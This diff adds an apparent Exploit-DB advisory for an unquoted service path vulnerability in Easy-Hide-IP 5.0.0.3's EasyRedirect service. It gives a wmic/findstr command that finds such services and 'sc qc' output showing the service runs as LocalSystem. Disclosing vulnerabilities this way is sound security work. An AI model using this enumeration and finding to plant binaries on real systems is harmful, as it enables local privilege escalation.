@@ -1,0 +1,36 @@
+# Exploit Title: Easy-Hide-IP 5.0.0.3 - 'EasyRedirect' Unquoted Service Path
+# Date: 2019-11-22
+# Exploit Author: Rene Cortes S
+# Vendor Homepage: https://easy-hide-ip.com
+# Software Link: https://easy-hide-ip.com
+# Version: 5.0.0.3
+# Tested on: Windows 7 Professional Service Pack 1
+
+##########################################################################################################################
+
+Step to discover the unquoted Service:
+
+C:\Users\user>wmic service get name, displayname, pathname, startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+EasyRedirect		EasyRedirect	C:\Program Files\Easy-Hide-IP\rdr\EasyRedirect.exe	Auto
+
+
+##############################################################################################################################################
+
+Service info:
+
+C:\Users\user>sc qc EasyRedirect
+[SC] QueryServiceConfig CORRECTO
+
+NOMBRE_SERVICIO: EasyRedirect
+        TIPO               : 10  WIN32_OWN_PROCESS
+        TIPO_INICIO        : 2   AUTO_START
+        CONTROL_ERROR      : 1   NORMAL
+        NOMBRE_RUTA_BINARIO: C:\Program Files\Easy-Hide-IP\rdr\EasyRedirect.exe
+        GRUPO_ORDEN_CARGA  : 
+        ETIQUETA           : 0
+        NOMBRE_MOSTRAR     : EasyRedirect
+        DEPENDENCIAS       : RPCSS
+        NOMBRE_INICIO_SERVICIO: LocalSystem
+
+#########################################################################################################################
